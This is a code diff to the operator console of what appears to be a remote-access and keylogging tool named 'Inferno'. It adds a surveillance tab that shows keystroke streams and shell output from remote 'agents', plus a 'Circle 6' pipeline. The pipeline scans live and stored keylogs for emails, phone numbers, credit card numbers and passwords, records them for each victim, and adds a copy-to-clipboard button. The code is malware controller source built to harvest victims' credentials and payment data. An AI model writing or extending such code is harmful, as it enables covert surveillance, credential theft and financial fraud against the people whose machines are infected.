@@ -3,6 +3,7 @@
 #include "../include/CommandDialog.hpp"
 #include "../include/Inferno_Database.hpp"
 #include "../include/AgentCardDialog.hpp"
+#include "../include/Analysis.hpp"
 #include <QVBoxLayout>
 #include <QHBoxLayout>
 #include <QFile>
@@ -15,6 +16,9 @@
 #include <QPushButton>
 #include <QListWidget>
 #include <QPlainTextEdit>
+#include <QGuiApplication>
+#include <QClipboard>
+#include <QHeaderView>
 
 namespace {
     constexpr int kMaxHistoryLines = 50000;
@@ -91,7 +95,7 @@ void MainWindow::setupUI() {
     brandingLabel->setContentsMargins(0, 5, 20, 5);
     toolbar->addWidget(brandingLabel);
 
-    // 2. Main Three-Pane Layout using QSplitter
+    // 2. Main Layout Splitter (Sidebar vs Tabs)
     auto* mainSplitter = new QSplitter(Qt::Horizontal, centralWidget);
     
     // Pane A: Agent Sidebar
@@ -132,8 +136,27 @@ void MainWindow::setupUI() {
         AgentCardDialog dlg(profile, this);
         dlg.exec();
     });
+    connect(m_agentList, &QListWidget::itemSelectionChanged, this, [this](){
+        loadTelemetryHistory();
+        loadKeylogHistory();
+        loadIntelligenceList();
+    });
     agentLayout->addWidget(m_agentList);
     mainSplitter->addWidget(agentContainer);
+
+    // Right Pane: Tab Widget
+    m_tabWidget = new QTabWidget(centralWidget);
+    m_tabWidget->setStyleSheet(
+        "QTabWidget::pane { border: 1px solid #1a1a1a; background: #000; }"
+        "QTabBar::tab { background: #0c0c0c; color: #666; border: 1px solid #1a1a1a; padding: 10px 20px; font-weight: bold; font-size: 13px; }"
+        "QTabBar::tab:selected { background: #000; color: #00ff41; border-bottom: 2px solid #00ff41; }"
+        "QTabBar::tab:hover { background: #111; color: #fff; }"
+    );
+
+    // Tab 1: Control Center (Splitter for Telemetry & Keylogs)
+    auto* controlWidget = new QWidget();
+    auto* controlLayout = new QVBoxLayout(controlWidget);
+    controlLayout->setContentsMargins(0, 0, 0, 0);
 
     // Pane B: Telemetry Console
     auto* telemetryContainer = new QWidget();
@@ -219,7 +242,6 @@ void MainWindow::setupUI() {
         menu.exec(m_telemetryConsole->mapToGlobal(pos));
     });
     telemetryLayout->addWidget(m_telemetryConsole);
-    mainSplitter->addWidget(telemetryContainer);
 
     // Pane C: Keystroke Stream
     auto* keylogContainer = new QWidget();
@@ -259,12 +281,90 @@ void MainWindow::setupUI() {
     keylogLayout->addLayout(keylogToolLayout);
 
     keylogLayout->addWidget(m_keylogStream);
-    mainSplitter->addWidget(keylogContainer);
 
-    // Set initial splitter sizes (20%, 50%, 30%)
+    auto* controlSplitter = new QSplitter(Qt::Horizontal, controlWidget);
+    controlSplitter->addWidget(telemetryContainer);
+    controlSplitter->addWidget(keylogContainer);
+    controlSplitter->setStretchFactor(0, 3);
+    controlSplitter->setStretchFactor(1, 2);
+    
+    controlLayout->addWidget(controlSplitter);
+    m_tabWidget->addTab(controlWidget, "Surveillance & Controls");
+
+    // Tab 2: Intelligence & Analysis (Circle 6)
+    auto* intelWidget = new QWidget();
+    auto* intelLayout = new QVBoxLayout(intelWidget);
+    intelLayout->setContentsMargins(10, 10, 10, 10);
+
+    auto* intelHeader = new QHBoxLayout();
+    intelHeader->addWidget(new QLabel("CLASSIFIED FORENSIC INTELLIGENCE"));
+    intelHeader->addStretch();
+
+    auto* btnScanHistory = new QPushButton("Force Scan History");
+    btnScanHistory->setStyleSheet(
+        "QPushButton { background: #0c0c0c; border: 1px solid #00ff41; color: #00ff41; padding: 6px 12px; font-weight: bold; border-radius: 3px; }"
+        "QPushButton:hover { background: #00ff41; color: #000; }"
+    );
+    connect(btnScanHistory, &QPushButton::clicked, this, &MainWindow::forceScanHistory);
+    intelHeader->addWidget(btnScanHistory);
+
+    auto* btnCopyIntel = new QPushButton("Copy Finding");
+    btnCopyIntel->setStyleSheet(
+        "QPushButton { background: #0c0c0c; border: 1px solid #00ff41; color: #00ff41; padding: 6px 12px; font-weight: bold; border-radius: 3px; }"
+        "QPushButton:hover { background: #00ff41; color: #000; }"
+    );
+    connect(btnCopyIntel, &QPushButton::clicked, this, &MainWindow::copySelectedIntel);
+    intelHeader->addWidget(btnCopyIntel);
+
+    auto* btnClearIntel = new QPushButton("Clear Findings");
+    btnClearIntel->setStyleSheet(
+        "QPushButton { background: #0c0c0c; border: 1px solid #ff0000; color: #ff0000; padding: 6px 12px; font-weight: bold; border-radius: 3px; }"
+        "QPushButton:hover { background: #ff0000; color: #000; }"
+    );
+    connect(btnClearIntel, &QPushButton::clicked, this, &MainWindow::clearIntelFindings);
+    intelHeader->addWidget(btnClearIntel);
+
+    intelLayout->addLayout(intelHeader);
+
+    auto* intelFiltersRow = new QHBoxLayout();
+    m_intelSearchBox = new QLineEdit();
+    m_intelSearchBox->setPlaceholderText("Filter findings...");
+    m_intelSearchBox->setStyleSheet("background: #000; border: 1px solid #1a1a1a; color: #00ff41; padding: 5px;");
+    connect(m_intelSearchBox, &QLineEdit::textChanged, this, &MainWindow::loadIntelligenceList);
+    intelFiltersRow->addWidget(m_intelSearchBox);
+
+    m_intelTypeFilter = new QComboBox();
+    m_intelTypeFilter->addItem("All Findings", "ALL");
+    m_intelTypeFilter->addItem("Emails", "EMAIL");
+    m_intelTypeFilter->addItem("Phone Numbers", "PHONE");
+    m_intelTypeFilter->addItem("Credit Cards", "CREDIT_CARD");
+    m_intelTypeFilter->addItem("Passwords", "PASSWORD");
+    m_intelTypeFilter->setStyleSheet("background: #000; color: #00ff41; border: 1px solid #1a1a1a; padding: 5px;");
+    connect(m_intelTypeFilter, QOverload<int>::of(&QComboBox::currentIndexChanged), this, &MainWindow::loadIntelligenceList);
+    intelFiltersRow->addWidget(m_intelTypeFilter);
+
+    intelLayout->addLayout(intelFiltersRow);
+
+    m_intelTable = new QTableWidget(0, 4, intelWidget);
+    m_intelTable->setHorizontalHeaderLabels({"TYPE", "VALUE", "CONTEXT", "TIMESTAMP"});
+    m_intelTable->setStyleSheet(
+        "QTableWidget { background: #000; border: 1px solid #1a1a1a; color: #00ff41; gridline-color: #111; font-size: 13px; }"
+        "QTableWidget::item { padding: 8px; }"
+        "QTableWidget::item:selected { background: #00ff41; color: #000; }"
+        "QHeaderView::section { background: #0c0c0c; color: #888; border: 1px solid #1a1a1a; padding: 6px; font-weight: bold; }"
+    );
+    m_intelTable->horizontalHeader()->setStretchLastSection(true);
+    m_intelTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);
+    m_intelTable->setSelectionBehavior(QAbstractItemView::SelectRows);
+    m_intelTable->setSelectionMode(QAbstractItemView::SingleSelection);
+    m_intelTable->setEditTriggers(QAbstractItemView::NoEditTriggers);
+    intelLayout->addWidget(m_intelTable);
+
+    m_tabWidget->addTab(intelWidget, "Intelligence Analysis");
+
+    mainSplitter->addWidget(m_tabWidget);
     mainSplitter->setStretchFactor(0, 1);
-    mainSplitter->setStretchFactor(1, 3);
-    mainSplitter->setStretchFactor(2, 2);
+    mainSplitter->setStretchFactor(1, 4);
 
     mainLayout->addWidget(mainSplitter);
 
@@ -375,6 +475,29 @@ void MainWindow::onShellOutputReceived(const QString& ip, const QString& output)
 
         QString formatted = QString("[%1] [%2] %3").arg(timestamp, ip, trimmed);
         appendToTelemetry(formatted);
+
+        // Circle 6 analysis pipeline
+        std::string text = trimmed.toStdString();
+        auto emails = Analysis::extractEmails(text);
+        for (const auto& email : emails) {
+            Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Shell Output: " + trimmed);
+        }
+        auto phones = Analysis::extractPhones(text);
+        for (const auto& phone : phones) {
+            Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Shell Output: " + trimmed);
+        }
+        auto cards = Analysis::extractCreditCards(text);
+        for (const auto& card : cards) {
+            Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Shell Output: " + trimmed);
+        }
+        auto passwords = Analysis::extractPasswords(text);
+        for (const auto& pair : passwords) {
+            Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second));
+        }
+    }
+
+    if (m_agentList->currentItem() && m_agentList->currentItem()->data(Qt::UserRole).toString() == ip) {
+        loadIntelligenceList();
     }
 }
 
@@ -408,6 +531,29 @@ void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
     QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
     QString line = QString("[%1] [%2] %3").arg(timestamp, ip, data);
     appendToKeylog(line);
+
+    // Circle 6 analysis pipeline
+    std::string text = data.toStdString();
+    auto emails = Analysis::extractEmails(text);
+    for (const auto& email : emails) {
+        Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Keylog Stream");
+    }
+    auto phones = Analysis::extractPhones(text);
+    for (const auto& phone : phones) {
+        Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Keylog Stream");
+    }
+    auto cards = Analysis::extractCreditCards(text);
+    for (const auto& card : cards) {
+        Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Keylog Stream");
+    }
+    auto passwords = Analysis::extractPasswords(text);
+    for (const auto& pair : passwords) {
+        Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second));
+    }
+
+    if (m_agentList->currentItem() && m_agentList->currentItem()->data(Qt::UserRole).toString() == ip) {
+        loadIntelligenceList();
+    }
 }
 
 void MainWindow::appendToTelemetry(const QString& text) {
@@ -611,6 +757,164 @@ void MainWindow::loadKeylogHistory() {
     }
     m_keylogStream->appendPlainText("[SYSTEM] Keylog database history dump complete.");
     m_statusLabel->setText(" Keylog history reloaded from SQL");
+}
+
+void MainWindow::loadIntelligenceList() {
+    m_intelTable->setRowCount(0);
+    
+    auto* current = m_agentList->currentItem();
+    if (!current) return;
+    
+    QString ip = current->data(Qt::UserRole).toString();
+    QString uuid = m_agentIpToUuid.value(ip);
+    if (uuid.isEmpty()) return;
+
+    QString filterType = m_intelTypeFilter->currentData().toString();
+    QString searchVal = m_intelSearchBox->text().trimmed();
+
+    QList<IntelEntry> list = Inferno_Database::instance().getIntelligence(uuid, filterType);
+    
+    int row = 0;
+    for (const auto& entry : list) {
+        if (!searchVal.isEmpty() && 
+            !entry.value.contains(searchVal, Qt::CaseInsensitive) && 
+            !entry.context.contains(searchVal, Qt::CaseInsensitive)) {
+            continue;
+        }
+
+        m_intelTable->insertRow(row);
+        
+        auto* itemType = new QTableWidgetItem(entry.dataType);
+        auto* itemValue = new QTableWidgetItem(entry.value);
+        auto* itemContext = new QTableWidgetItem(entry.context);
+        auto* itemTime = new QTableWidgetItem(entry.timestamp);
+
+        itemType->setForeground(QColor(0, 255, 65));
+        itemValue->setForeground(Qt::white);
+        itemContext->setForeground(QColor(170, 170, 170));
+        itemTime->setForeground(QColor(120, 120, 120));
+
+        m_intelTable->setItem(row, 0, itemType);
+        m_intelTable->setItem(row, 1, itemValue);
+        m_intelTable->setItem(row, 2, itemContext);
+        m_intelTable->setItem(row, 3, itemTime);
+        
+        row++;
+    }
+}
+
+void MainWindow::forceScanHistory() {
+    auto* current = m_agentList->currentItem();
+    if (!current) {
+        onStatusMessage("No agent selected to perform scan");
+        return;
+    }
+    
+    QString ip = current->data(Qt::UserRole).toString();
+    QString uuid = m_agentIpToUuid.value(ip);
+    if (uuid.isEmpty()) return;
+
+    onStatusMessage("Scanning historical logs for agent " + ip + "...");
+    
+    QStringList keylogs = Inferno_Database::instance().getKeylogHistory(uuid, 5000);
+    int new_findings = 0;
+    
+    for (const QString& line : keylogs) {
+        QString cleanLine = line;
+        if (line.startsWith("[") && line.indexOf("]") > 0) {
+            cleanLine = line.mid(line.indexOf("]") + 1).trimmed();
+        }
+        
+        std::string text = cleanLine.toStdString();
+        
+        auto emails = Analysis::extractEmails(text);
+        for (const auto& email : emails) {
+            if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Historical Keylog")) {
+                new_findings++;
+            }
+        }
+        auto phones = Analysis::extractPhones(text);
+        for (const auto& phone : phones) {
+            if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Historical Keylog")) {
+                new_findings++;
+            }
+        }
+        auto cards = Analysis::extractCreditCards(text);
+        for (const auto& card : cards) {
+            if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Historical Keylog")) {
+                new_findings++;
+            }
+        }
+        auto passwords = Analysis::extractPasswords(text);
+        for (const auto& pair : passwords) {
+            if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
+                new_findings++;
+            }
+        }
+    }
+
+    QStringList telemetry = Inferno_Database::instance().getTelemetryHistory(uuid, "ALL", 5000);
+    for (const QString& line : telemetry) {
+        QString cleanLine = line;
+        if (line.startsWith("[") && line.indexOf("]") > 0) {
+            cleanLine = line.mid(line.indexOf("]") + 1).trimmed();
+        }
+        
+        std::string text = cleanLine.toStdString();
+        
+        auto emails = Analysis::extractEmails(text);
+        for (const auto& email : emails) {
+            if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Historical Telemetry")) {
+                new_findings++;
+            }
+        }
+        auto phones = Analysis::extractPhones(text);
+        for (const auto& phone : phones) {
+            if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Historical Telemetry")) {
+                new_findings++;
+            }
+        }
+        auto cards = Analysis::extractCreditCards(text);
+        for (const auto& card : cards) {
+            if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Historical Telemetry")) {
+                new_findings++;
+            }
+        }
+        auto passwords = Analysis::extractPasswords(text);
+        for (const auto& pair : passwords) {
+            if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
+                new_findings++;
+            }
+        }
+    }
+
+    loadIntelligenceList();
+    onStatusMessage(QString("Scan complete. Identified %1 new findings.").arg(new_findings));
+}
+
+void MainWindow::copySelectedIntel() {
+    int row = m_intelTable->currentRow();
+    if (row < 0) return;
+    
+    QTableWidgetItem* valItem = m_intelTable->item(row, 1);
+    if (!valItem) return;
+    
+    QGuiApplication::clipboard()->setText(valItem->text());
+    onStatusMessage("Copied to clipboard: " + valItem->text());
+}
+
+void MainWindow::clearIntelFindings() {
+    auto* current = m_agentList->currentItem();
+    if (!current) return;
+    
+    QString ip = current->data(Qt::UserRole).toString();
+    QString uuid = m_agentIpToUuid.value(ip);
+    if (uuid.isEmpty()) return;
+
+    if (Inferno_Database::instance().clearIntelligence(uuid)) {
+        loadIntelligenceList();
+        onStatusMessage("Cleared intelligence findings for agent " + ip);
+    }
 }
 
 } // namespace inferno
